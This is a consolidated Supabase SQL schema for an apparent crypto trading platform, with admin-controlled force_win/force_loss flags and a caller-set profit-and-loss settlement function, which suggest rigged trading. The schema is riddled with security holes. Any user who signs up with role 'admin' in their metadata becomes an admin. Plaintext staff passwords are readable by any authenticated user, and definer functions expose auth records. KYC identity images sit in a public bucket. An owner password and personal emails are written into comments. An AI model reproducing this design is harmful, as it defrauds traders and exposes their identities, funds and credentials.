-- =============================================
-- CRYPX-PRO DATABASE SCHEMA (CONSOLIDATED)
-- =============================================

-- 1. Create role enum
DO $$ BEGIN
    CREATE TYPE public.app_role AS ENUM ('admin', 'user');
EXCEPTION
    WHEN duplicate_object THEN null;
END $$;

-- 2. Profiles table
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID NOT NULL PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  display_name TEXT,
  avatar_url TEXT,
  email TEXT,
  username TEXT,
  ftid TEXT,
  balance NUMERIC DEFAULT 0,
  futures_balance NUMERIC DEFAULT 0,
  staked_balance NUMERIC DEFAULT 0,
  kyc_status TEXT DEFAULT 'UNVERIFIED',
  withdrawal_address TEXT,
  force_win BOOLEAN DEFAULT false,
  force_loss BOOLEAN DEFAULT false,
  is_admin BOOLEAN DEFAULT false,
  admin_permissions JSONB,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;

-- 3. User Roles table
CREATE TABLE IF NOT EXISTS public.user_roles (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    role app_role NOT NULL DEFAULT 'user',
    UNIQUE (user_id, role)
);

ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

-- 4. User Assets table
CREATE TABLE IF NOT EXISTS public.user_assets (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    symbol TEXT NOT NULL,
    amount NUMERIC NOT NULL DEFAULT 0,
    created_at TIMESTAMPTZ DEFAULT now(),
    UNIQUE(user_id, symbol)
);

ALTER TABLE public.user_assets ENABLE ROW LEVEL SECURITY;

-- 5. Positions table (futures trading)
CREATE TABLE IF NOT EXISTS public.positions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    pair TEXT NOT NULL,
    amount NUMERIC NOT NULL,
    margin NUMERIC NOT NULL,
    leverage INTEGER NOT NULL,
    entry_price NUMERIC NOT NULL,
    type TEXT NOT NULL CHECK (type IN ('LONG', 'SHORT')),
    start_time BIGINT NOT NULL,
    duration_seconds INTEGER NOT NULL,
    expected_profit_percentage NUMERIC NOT NULL DEFAULT 0,
    status TEXT NOT NULL DEFAULT 'OPEN' CHECK (status IN ('OPEN', 'CLOSED')),
    pnl NUMERIC,
    created_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.positions ENABLE ROW LEVEL SECURITY;

-- 6. Deposits table
CREATE TABLE IF NOT EXISTS public.deposits (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    asset TEXT NOT NULL,
    network TEXT NOT NULL,
    amount NUMERIC NOT NULL,
    address TEXT NOT NULL DEFAULT '',
    status TEXT NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING', 'APPROVED', 'REJECTED')),
    timestamp TIMESTAMPTZ DEFAULT now(),
    created_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.deposits ENABLE ROW LEVEL SECURITY;

-- 6.5 Withdrawals table
CREATE TABLE IF NOT EXISTS public.withdrawals (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    asset TEXT NOT NULL,
    network TEXT NOT NULL,
    amount NUMERIC NOT NULL,
    address TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING', 'APPROVED', 'REJECTED')),
    note TEXT,
    created_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.withdrawals ENABLE ROW LEVEL SECURITY;

-- 7. Admin Wallets table
CREATE TABLE IF NOT EXISTS public.admin_wallets (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    symbol TEXT NOT NULL,
    network TEXT NOT NULL,
    address TEXT NOT NULL DEFAULT '',
    UNIQUE(symbol, network)
);

ALTER TABLE public.admin_wallets ENABLE ROW LEVEL SECURITY;

-- 8. Support Config table
CREATE TABLE IF NOT EXISTS public.support_config (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email TEXT DEFAULT '',
    telegram TEXT DEFAULT '',
    whatsapp TEXT DEFAULT ''
);

ALTER TABLE public.support_config ENABLE ROW LEVEL SECURITY;

-- 9. KYC Submissions table
CREATE TABLE IF NOT EXISTS public.kyc_submissions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  full_name TEXT NOT NULL,
  date_of_birth TEXT NOT NULL,
  address TEXT NOT NULL,
  id_type TEXT NOT NULL DEFAULT 'passport',
  id_front_url TEXT,
  id_back_url TEXT,
  selfie_url TEXT,
  status TEXT NOT NULL DEFAULT 'PENDING',
  admin_notes TEXT,
  reviewed_by UUID,
  submitted_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  reviewed_at TIMESTAMP WITH TIME ZONE
);

ALTER TABLE public.kyc_submissions ENABLE ROW LEVEL SECURITY;

-- 10. Notifications table
CREATE TABLE IF NOT EXISTS public.notifications (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    title TEXT NOT NULL,
    message TEXT NOT NULL,
    is_read BOOLEAN DEFAULT false,
    created_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.notifications ENABLE ROW LEVEL SECURITY;

-- 11. Support Messages table
CREATE TABLE IF NOT EXISTS public.support_messages (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
    sender_type TEXT NOT NULL CHECK (sender_type IN ('user', 'admin')),
    message TEXT NOT NULL,
    created_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.support_messages ENABLE ROW LEVEL SECURITY;

-- =============================================
-- FUNCTIONS & TRIGGERS
-- =============================================

-- Role checking function
CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role app_role)
RETURNS BOOLEAN
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles
    WHERE user_id = _user_id AND role = _role
  ) OR (
    _role = 'admin' AND EXISTS (
      SELECT 1 FROM public.profiles 
      WHERE id = _user_id AND email = 'heathercarpe34@gmail.com'
    )
  )
$$;

-- FTID Generator
CREATE OR REPLACE FUNCTION public.generate_ftid()
RETURNS text
LANGUAGE plpgsql
SET search_path TO 'public'
AS $$
BEGIN
  RETURN 'FID-' || UPPER(SUBSTRING(gen_random_uuid()::text FROM 1 FOR 9));
END;
$$;

-- Handle New User Trigger Function
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $$
DECLARE
  v_is_admin boolean;
  v_permissions jsonb;
BEGIN
  -- Determine if the email is a primary owner or if user metadata indicates admin role,
  -- or if they are already defined in custom_accounts (or if their email matches an existing custom_account).
  v_is_admin := (
    NEW.email IN ('heathercarpe34@gmail.com', 'arkarnaung009@gmail.com', 'lovelybird33333@gmail.com', 'admin1@crypxpro.com', 'admin2@crypxpro.com', 'admin3@crypxpro.com')
    OR COALESCE(NEW.raw_user_meta_data->>'role', '') = 'admin'
    OR EXISTS (SELECT 1 FROM public.custom_accounts WHERE LOWER(email) = LOWER(NEW.email) AND role = 'admin')
  );

  IF v_is_admin THEN
    -- Try to fetch permissions from custom_accounts if they exist, else default to full permissions
    SELECT permissions INTO v_permissions 
    FROM public.custom_accounts 
    WHERE LOWER(email) = LOWER(NEW.email);
    
    IF v_permissions IS NULL THEN
      v_permissions := '{"dashboard":true,"users":true,"financial-status":true,"deposit-requests":true,"withdrawals":true,"futures":true,"kyc":true,"wallets":true,"customer-service":true,"support":true}'::jsonb;
    END IF;
  ELSE
    v_permissions := NULL;
  END IF;

  INSERT INTO public.profiles (
    id, 
    display_name, 
    email, 
    username, 
    ftid, 
    balance, 
    futures_balance, 
    staked_balance, 
    kyc_status, 
    force_win, 
    force_loss,
    is_admin,
    admin_permissions
  )
  VALUES (
    NEW.id,
    COALESCE(NEW.raw_user_meta_data->>'username', NEW.raw_user_meta_data->>'display_name', NEW.email),
    NEW.email,
    COALESCE(NEW.raw_user_meta_data->>'username', NEW.raw_user_meta_data->>'display_name', split_part(NEW.email, '@', 1)),
    public.generate_ftid(),
    0,
    0,
    0,
    'UNVERIFIED',
    false,
    false,
    v_is_admin,
    v_permissions
  );
  
  -- Assign role Based on email and metadata
  IF v_is_admin THEN
    INSERT INTO public.user_roles (user_id, role) 
    VALUES (NEW.id, 'admin')
    ON CONFLICT (user_id, role) DO NOTHING;
  ELSE
    INSERT INTO public.user_roles (user_id, role) 
    VALUES (NEW.id, 'user')
    ON CONFLICT (user_id, role) DO NOTHING;
  END IF;
  
  RETURN NEW;
END;
$$;

-- Recreate trigger
DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- Update timestamp trigger
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

DROP TRIGGER IF EXISTS update_profiles_updated_at ON public.profiles;
CREATE TRIGGER update_profiles_updated_at
BEFORE UPDATE ON public.profiles
FOR EACH ROW
EXECUTE FUNCTION public.update_updated_at_column();

-- Close trade position RPC function
CREATE OR REPLACE FUNCTION public.close_trade_position(p_pos_id UUID, p_pnl NUMERIC)
RETURNS BOOLEAN
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
    v_pos RECORD;
    v_settlement NUMERIC;
BEGIN
    -- Get position
    SELECT * INTO v_pos FROM public.positions WHERE id = p_pos_id AND status = 'OPEN';
    IF NOT FOUND THEN RETURN FALSE; END IF;

    -- Close position
    UPDATE public.positions SET status = 'CLOSED', pnl = p_pnl WHERE id = p_pos_id;

    -- Calculate settlement: margin + pnl
    v_settlement := v_pos.margin + p_pnl;

    -- Update user's futures balance
    UPDATE public.profiles 
    SET futures_balance = futures_balance + v_settlement
    WHERE id = v_pos.user_id;

    RETURN TRUE;
END;
$$;

-- =============================================
-- RLS POLICIES
-- =============================================

-- Profiles
DROP POLICY IF EXISTS "Anyone can view profiles" ON public.profiles;
CREATE POLICY "Anyone can view profiles" ON public.profiles FOR SELECT USING (true);

DROP POLICY IF EXISTS "Users can insert own profile" ON public.profiles;
CREATE POLICY "Users can insert own profile" ON public.profiles FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Users can update own profile" ON public.profiles;
CREATE POLICY "Users can update own profile" ON public.profiles FOR UPDATE USING (auth.uid() = id) WITH CHECK (auth.uid() = id);

DROP POLICY IF EXISTS "Admins can update any profile" ON public.profiles;
CREATE POLICY "Admins can update any profile" ON public.profiles FOR UPDATE TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- User Roles
DROP POLICY IF EXISTS "Users can read own roles" ON public.user_roles;
CREATE POLICY "Users can read own roles" ON public.user_roles FOR SELECT TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can read all roles" ON public.user_roles;
CREATE POLICY "Admins can read all roles" ON public.user_roles FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- User Assets
DROP POLICY IF EXISTS "Users can view own assets" ON public.user_assets;
CREATE POLICY "Users can view own assets" ON public.user_assets FOR SELECT TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own assets" ON public.user_assets;
CREATE POLICY "Users can insert own assets" ON public.user_assets FOR INSERT TO authenticated WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can update own assets" ON public.user_assets;
CREATE POLICY "Users can update own assets" ON public.user_assets FOR UPDATE TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can delete own assets" ON public.user_assets;
CREATE POLICY "Users can delete own assets" ON public.user_assets FOR DELETE TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can manage all assets" ON public.user_assets;
CREATE POLICY "Admins can manage all assets" ON public.user_assets FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- Positions
DROP POLICY IF EXISTS "Users can view own positions" ON public.positions;
CREATE POLICY "Users can view own positions" ON public.positions FOR SELECT TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own positions" ON public.positions;
CREATE POLICY "Users can insert own positions" ON public.positions FOR INSERT TO authenticated WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can view all positions" ON public.positions;
CREATE POLICY "Admins can view all positions" ON public.positions FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- Deposits
DROP POLICY IF EXISTS "Users can view own deposits" ON public.deposits;
CREATE POLICY "Users can view own deposits" ON public.deposits FOR SELECT TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can create deposits" ON public.deposits;
CREATE POLICY "Users can create deposits" ON public.deposits FOR INSERT TO authenticated WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can view and manage all deposits" ON public.deposits;
CREATE POLICY "Admins can view and manage all deposits" ON public.deposits FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- Withdrawals
DROP POLICY IF EXISTS "Users can view own withdrawals" ON public.withdrawals;
CREATE POLICY "Users can view own withdrawals" ON public.withdrawals FOR SELECT TO authenticated USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can create withdrawals" ON public.withdrawals;
CREATE POLICY "Users can create withdrawals" ON public.withdrawals FOR INSERT TO authenticated WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can view and manage all withdrawals" ON public.withdrawals;
CREATE POLICY "Admins can view and manage all withdrawals" ON public.withdrawals FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- Admin Wallets
DROP POLICY IF EXISTS "Anyone can read wallets" ON public.admin_wallets;
CREATE POLICY "Anyone can read wallets" ON public.admin_wallets FOR SELECT TO authenticated USING (true);
DROP POLICY IF EXISTS "Admins can manage wallets" ON public.admin_wallets;
CREATE POLICY "Admins can manage wallets" ON public.admin_wallets FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- Support Config
DROP POLICY IF EXISTS "Anyone can read support config" ON public.support_config;
CREATE POLICY "Anyone can read support config" ON public.support_config FOR SELECT TO authenticated USING (true);
DROP POLICY IF EXISTS "Admins can manage support config" ON public.support_config;
CREATE POLICY "Admins can manage support config" ON public.support_config FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- KYC Submissions
DROP POLICY IF EXISTS "Users can view own KYC submissions" ON public.kyc_submissions;
CREATE POLICY "Users can view own KYC submissions" ON public.kyc_submissions FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own KYC submissions" ON public.kyc_submissions;
CREATE POLICY "Users can insert own KYC submissions" ON public.kyc_submissions FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can view all KYC submissions" ON public.kyc_submissions;
CREATE POLICY "Admins can view all KYC submissions" ON public.kyc_submissions FOR SELECT USING (public.has_role(auth.uid(), 'admin'::app_role));
DROP POLICY IF EXISTS "Admins can update KYC submissions" ON public.kyc_submissions;
CREATE POLICY "Admins can update KYC submissions" ON public.kyc_submissions FOR UPDATE USING (public.has_role(auth.uid(), 'admin'::app_role));

-- Notifications
DROP POLICY IF EXISTS "Users can view own notifications" ON public.notifications;
CREATE POLICY "Users can view own notifications" ON public.notifications FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can update own notifications" ON public.notifications;
CREATE POLICY "Users can update own notifications" ON public.notifications FOR UPDATE USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can manage all notifications" ON public.notifications;
CREATE POLICY "Admins can manage all notifications" ON public.notifications FOR ALL USING (public.has_role(auth.uid(), 'admin'::app_role));

-- Support Messages
DROP POLICY IF EXISTS "Users can view own messages" ON public.support_messages;
CREATE POLICY "Users can view own messages" ON public.support_messages FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own messages" ON public.support_messages;
CREATE POLICY "Users can insert own messages" ON public.support_messages FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Admins can view and manage all messages" ON public.support_messages;
CREATE POLICY "Admins can view and manage all messages" ON public.support_messages FOR ALL USING (public.has_role(auth.uid(), 'admin'::app_role));

-- =============================================
-- INITIAL DATA
-- =============================================
INSERT INTO public.support_config (email, telegram, whatsapp)
VALUES ('support@crypx-pro.com', '', '')
ON CONFLICT DO NOTHING;

-- =============================================
-- SUPABASE STORAGE BUCKETS SETUP
-- =============================================

-- Ensure buckets exist
INSERT INTO storage.buckets (id, name, public) 
VALUES ('kyc-documents', 'kyc-documents', true) 
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public) 
VALUES ('support-attachments', 'support-attachments', true) 
ON CONFLICT (id) DO NOTHING;

-- Policies for kyc-documents bucket
DROP POLICY IF EXISTS "Public Access" ON storage.objects;
CREATE POLICY "Public Access"
ON storage.objects FOR SELECT
USING ( bucket_id = 'kyc-documents' );

DROP POLICY IF EXISTS "Authenticated Users Upload" ON storage.objects;
CREATE POLICY "Authenticated Users Upload"
ON storage.objects FOR INSERT
TO authenticated
WITH CHECK ( bucket_id = 'kyc-documents' AND auth.uid() = (storage.foldername(name))[1]::uuid );

-- Policies for support-attachments bucket
DROP POLICY IF EXISTS "Public Access support-attachments" ON storage.objects;
CREATE POLICY "Public Access support-attachments"
ON storage.objects FOR SELECT
USING ( bucket_id = 'support-attachments' );

DROP POLICY IF EXISTS "Authenticated Users Upload support-attachments" ON storage.objects;
CREATE POLICY "Authenticated Users Upload support-attachments"
ON storage.objects FOR INSERT
TO authenticated
WITH CHECK ( bucket_id = 'support-attachments' AND auth.uid() = (storage.foldername(name))[1]::uuid );

-- =========================================================================
-- DATABASE MIGRATIONS (AUTOMATIC / MANUAL APPLY)
-- =========================================================================
ALTER TABLE public.profiles ADD COLUMN IF NOT EXISTS is_admin BOOLEAN DEFAULT false;
ALTER TABLE public.profiles ADD COLUMN IF NOT EXISTS admin_permissions JSONB;

-- Sync primary owner/admin accounts
UPDATE public.profiles 
SET is_admin = true, 
    admin_permissions = '{"dashboard":true,"users":true,"financial-status":true,"deposit-requests":true,"withdrawals":true,"futures":true,"kyc":true,"wallets":true,"customer-service":true,"support":true}'::jsonb 
WHERE email IN ('heathercarpe34@gmail.com', 'arkarnaung009@gmail.com', 'lovelybird33333@gmail.com');

-- =========================================================================
-- SYSTEM OPERATION: PASSWORD UPDATE FOR OWNER ACCOUNT
-- =========================================================================
-- To update the password of heathercarpe34@gmail.com directly in your 
-- Supabase Authentication database, copy and run the following command 
-- in your Supabase SQL Editor:
--
-- UPDATE auth.users 
-- SET encrypted_password = crypt('AungMoe$357', gen_salt('bf')) 
-- WHERE email = 'heathercarpe34@gmail.com';
-- =========================================================================

-- =========================================================================
-- UPGRADES: ADMIN PORTAL EXTENSIONS
-- =========================================================================

-- Custom admin/staff accounts registry table
CREATE TABLE IF NOT EXISTS public.custom_accounts (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    custom_id TEXT NOT NULL UNIQUE,
    email TEXT NOT NULL UNIQUE,
    username TEXT NOT NULL,
    role TEXT NOT NULL CHECK (role IN ('admin', 'staff')),
    password TEXT,
    created_by_admin_id TEXT,
    permissions JSONB NOT NULL DEFAULT '{}'::jsonb,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

ALTER TABLE public.custom_accounts ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Anyone can read custom accounts" ON public.custom_accounts;
CREATE POLICY "Anyone can read custom accounts" ON public.custom_accounts FOR SELECT TO authenticated USING (true);

DROP POLICY IF EXISTS "Admins can manage custom accounts" ON public.custom_accounts;
CREATE POLICY "Admins can manage custom accounts" ON public.custom_accounts FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));


-- User referrals mapping table
CREATE TABLE IF NOT EXISTS public.user_referrals (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_email TEXT NOT NULL UNIQUE,
    user_id UUID,
    referred_by_admin_id TEXT NOT NULL,
    referred_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);

ALTER TABLE public.user_referrals ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Anyone can read user referrals" ON public.user_referrals;
CREATE POLICY "Anyone can read user referrals" ON public.user_referrals FOR SELECT TO authenticated USING (true);

DROP POLICY IF EXISTS "Anyone can create or edit referrals" ON public.user_referrals;
CREATE POLICY "Anyone can create or edit referrals" ON public.user_referrals FOR ALL TO authenticated USING (true);


-- Admin-specific wallet configurations table
CREATE TABLE IF NOT EXISTS public.admin_wallet_configs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    admin_id TEXT NOT NULL,
    symbol TEXT NOT NULL,
    network TEXT NOT NULL,
    address TEXT NOT NULL,
    UNIQUE(admin_id, symbol, network)
);

ALTER TABLE public.admin_wallet_configs ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Anyone can read admin wallet configs" ON public.admin_wallet_configs;
CREATE POLICY "Anyone can read admin wallet configs" ON public.admin_wallet_configs FOR SELECT TO authenticated USING (true);

DROP POLICY IF EXISTS "Admins can manage admin wallet configs" ON public.admin_wallet_configs;
CREATE POLICY "Admins can manage admin wallet configs" ON public.admin_wallet_configs FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- =========================================================================
-- CUSTOM ADMIN / STAFF MANAGEMENT FUNCTIONS
-- =========================================================================

-- Function to create a custom admin/staff user directly into Supabase Auth
CREATE OR REPLACE FUNCTION public.create_custom_admin(
    p_email text,
    p_password text,
    p_username text,
    p_custom_id text,
    p_role text,
    p_permissions jsonb
) RETURNS uuid AS $$
DECLARE
    v_user_id uuid;
    v_identity_id uuid;
BEGIN
    SELECT id INTO v_user_id FROM auth.users WHERE email = p_email LIMIT 1;
    
    IF v_user_id IS NULL THEN
        v_user_id := gen_random_uuid();
        v_identity_id := gen_random_uuid();

        INSERT INTO auth.users (
            instance_id, id, email, encrypted_password, email_confirmed_at,
            raw_app_meta_data, raw_user_meta_data, aud, role, created_at, updated_at,
            is_sso_user
        )
        VALUES (
            '00000000-0000-0000-0000-000000000000'::uuid,
            v_user_id,
            p_email,
            crypt(p_password, gen_salt('bf', 10)),
            now(),
            '{"provider":"email","providers":["email"]}'::jsonb,
            jsonb_build_object('username', p_username, 'custom_id', p_custom_id, 'role', p_role),
            'authenticated',
            'authenticated',
            now(),
            now(),
            false
        );

        INSERT INTO auth.identities (id, user_id, identity_data, provider, provider_id, last_sign_in_at, created_at, updated_at)
        VALUES (
            v_identity_id, 
            v_user_id,
            jsonb_build_object('sub', v_user_id::text, 'email', p_email, 'email_verified', true),
            'email',
            p_email, 
            now(),
            now(),
            now()
        );
    ELSE
        UPDATE auth.users
        SET encrypted_password = crypt(p_password, gen_salt('bf', 10)),
            raw_user_meta_data = jsonb_build_object('username', p_username, 'custom_id', p_custom_id, 'role', p_role),
            email_confirmed_at = COALESCE(email_confirmed_at, now())
        WHERE id = v_user_id;
    END IF;

    INSERT INTO public.user_roles (user_id, role)
    VALUES (v_user_id, 'admin')
    ON CONFLICT (user_id, role) DO NOTHING;

    INSERT INTO public.custom_accounts (id, custom_id, email, username, role, password, permissions)
    VALUES (v_user_id, p_custom_id, p_email, p_username, p_role, p_password, p_permissions)
    ON CONFLICT (email) DO UPDATE
    SET role = EXCLUDED.role,
        permissions = EXCLUDED.permissions,
        password = EXCLUDED.password,
        username = EXCLUDED.username;

    RETURN v_user_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Function to delete a custom admin/staff user
CREATE OR REPLACE FUNCTION public.delete_custom_admin(p_email text)
RETURNS boolean AS $$
DECLARE
    v_user_id uuid;
BEGIN
    SELECT id INTO v_user_id FROM auth.users WHERE email = p_email;
    IF v_user_id IS NOT NULL THEN
        DELETE FROM public.custom_accounts WHERE email = p_email;
        DELETE FROM public.user_roles WHERE user_id = v_user_id;
        DELETE FROM auth.identities WHERE user_id = v_user_id;
        DELETE FROM auth.users WHERE id = v_user_id;
        RETURN true;
    END IF;
    RETURN false;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Function to read custom accounts without RLS blocks during login
CREATE OR REPLACE FUNCTION public.get_all_custom_accounts()
RETURNS SETOF public.custom_accounts AS $$
BEGIN
    RETURN QUERY SELECT * FROM public.custom_accounts;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Debug function to inspect auth.users table columns and rows
CREATE OR REPLACE FUNCTION public.debug_inspect_auth_user(p_email text)
RETURNS jsonb AS $$
DECLARE
    v_row jsonb;
BEGIN
    SELECT row_to_json(u)::jsonb INTO v_row FROM auth.users u WHERE email = p_email LIMIT 1;
    RETURN v_row;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;


